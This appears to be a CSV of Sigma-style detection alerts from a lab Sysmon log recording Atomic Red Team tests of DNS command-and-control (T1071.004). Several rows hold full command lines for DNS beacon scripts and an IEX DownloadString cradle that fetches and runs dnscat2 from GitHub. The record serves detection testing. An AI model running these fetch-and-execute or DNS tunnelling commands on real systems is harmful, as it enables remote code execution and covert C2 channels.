"2025-12-22 13:59:16.973 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",166347,"Cmdline: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 10368 ¦ PGUID: E9F06A57-40A4-6949-5505-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 12:59:16.892","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:17.557 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",166356,"Cmdline: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:17.534","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:37.351 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",166582,"Cmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:36.889","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:59:16.973 +01:00","Suspicious Program Names","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",166347,"Cmdline: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 10368 ¦ PGUID: E9F06A57-40A4-6949-5505-000000002100 ¦ ParentPID: 416 ¦ ParentPGUID: E9F06A57-37B7-6949-AD04-000000002100 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Set-Location \""""C:\AtomicRedTeam\atomics\"""" .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 12:59:16.892","proc_creation_win_susp_progname.yml","6eb89d91-0b61-8b22-9a6f-86894f6de6ec","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:43.232 +01:00","Windows Shell/Scripting Processes Spawning Suspicious Programs","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec ¦ Evas","T1059.005 ¦ T1059.001 ¦ T1218","sysmon",166599,"Cmdline: ""C:\WINDOWS\system32\nslookup.exe"" ¦ Proc: C:\Windows\System32\nslookup.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 10420 ¦ PGUID: E9F06A57-4137-6949-6105-000000002100 ¦ ParentPID: 1740 ¦ ParentPGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ Description: nslookup ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=10FAC41C9075D456ABFBA9CD17C9A177,SHA256=123EF423B3B4623C02D60C683F5C0BCFEF232400A625FC172B7FAB04A97EB677,IMPHASH=EC3E3C718C086FAB4F7F35008A5E9116","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1150 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: nslookup.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:43.225","proc_creation_win_susp_shell_spawn_susp_program.yml","fb5e7a7a-c746-43b5-fa05-f34d01330afc","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:41.448 +01:00","Network Connection Initiated By PowerShell Process","low","DESKTOP-G2OBL3D","Sysmon",3,"Exec","T1059.001","detection.threat-hunting ¦ sysmon",166590,"Initiated: true ¦ Proto: tcp ¦ SrcIP: 192.168.201.128 ¦ SrcPort: 58805 ¦ SrcHost: DESKTOP-G2OBL3D.localdomain ¦ TgtIP: 185.199.109.133 ¦ TgtPort: 443 ¦ TgtHost: cdn-185-199-109-133.github.com ¦ User: DESKTOP-G2OBL3D\student ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1740 ¦ PGUID: E9F06A57-4130-6949-5A05-000000002100","DestinationIsIpv6: false ¦ DestinationPortName: https ¦ RuleName: - ¦ SourceIsIpv6: false ¦ SourcePortName: - ¦ UtcTime: 2025-12-22 13:01:39.292","net_connection_win_powershell_network_connection.yml","30030033-0a85-0cb9-bbc0-999b656bddcc","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:40.599 +01:00","Dynamic .NET Compilation Via Csc.EXE - Hunting","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1027.004","detection.threat-hunting ¦ sysmon",166588,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\vqrajkvx\vqrajkvx.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 10380 ¦ PGUID: E9F06A57-4134-6949-5C05-000000002100 ¦ ParentPID: 1740 ¦ ParentPGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:40.559","proc_creation_win_csc_compilation.yml","f9e69aab-6557-350e-1581-b1648bc0fff3","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:42.108 +01:00","Dynamic .NET Compilation Via Csc.EXE - Hunting","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1027.004","detection.threat-hunting ¦ sysmon",166595,"Cmdline: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\student\AppData\Local\Temp\ndjuqk4q\ndjuqk4q.cmdline"" ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ LID: 0x18dcf ¦ LGUID: E9F06A57-0DF8-6949-CF8D-010000000000 ¦ PID: 3096 ¦ PGUID: E9F06A57-4136-6949-5E05-000000002100 ¦ ParentPID: 1740 ¦ ParentPGUID: E9F06A57-4130-6949-5A05-000000002100 ¦ Description: Visual C# Command Line Compiler ¦ Product: Microsoft® .NET Framework ¦ Company: Microsoft Corporation ¦ Hashes: MD5=53803CB67327CC873A1C88604D54A1D4,SHA256=AAE1DB57F898CA8BDA18590C56F86CED6D0EAD80C22033B76FDFE9119706F116,IMPHASH=2E6A9097FBA347A254DAC72662FE1259","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 4.8.9232.0 built by: NET481REL1LAST_C ¦ IntegrityLevel: High ¦ OriginalFileName: csc.exe ¦ ParentCommandLine: ""powershell.exe"" & {IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-22 13:01:42.004","proc_creation_win_csc_compilation.yml","f9e69aab-6557-350e-1581-b1648bc0fff3","C:\Tools\Logs\art_1071_004.evtx"
